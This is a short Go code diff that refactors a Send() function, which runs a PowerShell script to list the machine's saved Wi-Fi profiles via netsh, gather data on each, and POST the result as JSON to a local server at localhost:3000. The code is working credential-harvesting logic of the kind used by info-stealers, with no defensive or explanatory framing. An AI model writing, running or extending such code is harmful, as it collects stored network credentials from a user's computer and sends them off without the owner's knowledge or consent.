@@ -5,7 +5,8 @@ import (
 )
 
 func Send() {
-	exec.Command("powershell", "-Command", `
+	// Define the PowerShell command
+	cmd := exec.Command("powershell", "-Command", `
 		$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() };
 		$wifiProfiles = @();
 		foreach ($profile in $profiles) {
@@ -20,5 +21,6 @@ func Send() {
 		};
 		$json = $wifiProfiles | ConvertTo-Json;
 		Invoke-RestMethod -Uri "http://localhost:3000/api/input" -Method Post -Body $json -ContentType "application/json";	
-	`).Run()
+	`)
+	cmd.Run()
 }
